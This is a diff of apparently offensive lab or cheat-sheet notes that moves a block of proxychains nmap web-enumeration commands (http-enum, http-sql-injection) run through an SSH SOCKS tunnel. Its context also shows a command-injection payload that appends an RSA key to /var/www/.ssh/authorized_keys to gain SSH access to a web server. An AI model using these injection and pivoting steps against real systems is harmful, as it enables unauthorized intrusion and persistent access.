@@ -80,6 +80,17 @@ On firefox type loopback followed by colon and fowarded port (127.0.0.1:port)
 #  Proxychains with http script
 ```
 proxychains nmap --script=http-enum.nse 192.168.28.100
+ssh root@10.50.24.104 -D 9050
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+```
+#   Outcome
+```
+directories within website that can be further enumerated
 ```
 
 ```
@@ -110,17 +121,6 @@ cat rsa key
 ; echo "<rsa key>" >> /var/www/.ssh/authorized_keys
 ssh into web server
 ```
-#  website enumeration
-```
-ssh root@10.50.24.104 -D 9050
-
-proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
-
-proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
-
-proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
-```
-
 
 
 
